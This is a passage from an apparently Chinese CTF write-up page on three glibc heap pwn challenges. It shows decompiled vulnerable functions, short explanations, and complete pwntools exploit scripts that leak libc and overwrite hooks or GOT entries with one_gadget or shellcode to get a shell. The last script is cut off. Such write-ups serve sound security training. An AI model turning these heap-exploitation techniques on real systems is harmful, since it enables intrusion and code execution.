<h2 id="ciscn-2019-s-2"><a href="#ciscn-2019-s-2" class="headerlink" title="ciscn_2019_s_2"></a>ciscn_2019_s_2</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">Edit</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  Data *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You want to steal the flag?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( heap_ptr[v1] )</span><br><span class="line">  {</span><br><span class="line">    v2 = (Data *)heap_ptr[v1];</span><br><span class="line">    <span class="keyword">if</span> ( v2-&gt;state )</span><br><span class="line">    {</span><br><span class="line">      --v2-&gt;state;</span><br><span class="line">      v3 = <span class="built_in">realloc</span>((<span class="type">void</span> *)v2-&gt;content, v2-&gt;size);</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      {</span><br><span class="line">        v2-&gt;content = (__int64)v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"New content:"</span>);</span><br><span class="line">        secure_read((<span class="type">void</span> *)v2-&gt;content, v2-&gt;size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"OK!"</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Can not edit this flag!"</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Dead!"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"None flag!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在edit里有一个realloc，其他函数都是正常的，如果size为0，则把realloc看成一个free，此时出现uaf漏洞</p>
<p>利用uaf，劫持结构体修改content所在的指针，指向需要的堆地址从而泄露出堆地址和libc，最后再利用uaf漏洞，写入hook为ogg即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ciscn_s_2'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25621</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Your choice:'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'size?&gt;'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">'New content:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">''</span>)</span><br><span class="line">uaf(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'aaaa'</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0x2a0</span></span><br><span class="line">li(<span class="string">'heap_base = '</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">'bbbb'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'cccc'</span>)   <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x2e0</span>))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">li(<span class="string">'free_hook = '</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">'dddd'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">''</span>)</span><br><span class="line">uaf(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="suctf2018-heap"><a href="#suctf2018-heap" class="headerlink" title="suctf2018_heap"></a>suctf2018_heap</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">creat</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( total &gt; <span class="number">19</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"tai duo le"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input len"</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">127</span> &amp;&amp; size &lt;= <span class="number">256</span> )</span><br><span class="line">  {</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">    s = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input your data"</span>);</span><br><span class="line">    read(<span class="number">0</span>, ptr, (<span class="type">unsigned</span> <span class="type">int</span>)size);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)s, (<span class="type">const</span> <span class="type">char</span> *)ptr);</span><br><span class="line">    ++total;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; total; ++i )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !heap_form[i] )</span><br><span class="line">      {</span><br><span class="line">        heap_form[i] = (<span class="type">char</span> *)s;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( i == total )</span><br><span class="line">      heap_form[i] = (<span class="type">char</span> *)s;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"no no no"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这题挺有意思的，如果read不输入\x00结束，则后一个字节也会被算入，那就是如果输入的值填满ptr，那么strcpy之后会把ptr下一个chunk的size位给覆盖掉，会覆盖成ptr的size大小</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input id"</span>);</span><br><span class="line">  index = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || total - <span class="number">1</span> &lt; index )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"no no no"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your data"</span>);</span><br><span class="line">  size = <span class="built_in">strlen</span>(heap_form[index]);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, heap_form[index], size);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>那么在edit功能中size的大小就会多上一个，此时可以控制下一个chunk的size</p>
<p>攻击思路很明显，利用此漏洞进行堆重叠，控制heap_form，从而可以控制堆块的地址，从而可以泄露出libc和任意地址写</p>
<p>exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./offbyone'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">29586</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'4:edit\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input len'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'input your data'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input id'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input id'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">'input your data'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input id'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">'a'</span> * <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">'b'</span> * <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">'c'</span> * <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'\xd1'</span>)</span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>) * <span class="number">7</span> + p64(<span class="number">0x51</span>)</span><br><span class="line">edit(<span class="number">2</span>, p1)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>) * <span class="number">17</span> + p64(<span class="number">0x91</span>) + p64(<span class="number">0x6020C0</span>)</span><br><span class="line">add(<span class="number">0xc0</span>, p2)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, p64(puts_got))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'puts_addr = '</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xe5863</span>, <span class="number">0x10a38c</span>, <span class="number">0x10a398</span>]</span><br><span class="line">one_gadget = one[<span class="number">7</span>] + libc_base</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(free_got))</span><br><span class="line">edit(<span class="number">0</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="qctf-2018-noleak"><a href="#qctf-2018-noleak" class="headerlink" title="qctf_2018_noleak"></a>qctf_2018_noleak</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  my_write(<span class="string">"Index: "</span>, <span class="number">7LL</span>);</span><br><span class="line">  index = read_input();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">free</span>(buf[index]);                           <span class="comment">// uaf</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>漏洞点一个uaf，保护机制没有PIE并且有执行权限，没有show功能</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x3fe000</span>)</span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></tbody></table></figure>

<p>所以利用思路比较清晰，利用double free将fd连到unsorted bin那里，借助unsorted bin改低字节到malloc_hook那里（先不用改到malloc_hook上），接下来打fd到存放堆地址的buf那里，这样就可以任意地址写了，在buf上写入shellcode然后控制hook为shellcode地址，最后触发即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./QCTF_2018_NoLeak'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26180</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Your choice :'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Size: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'Data: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Size: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'Data: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    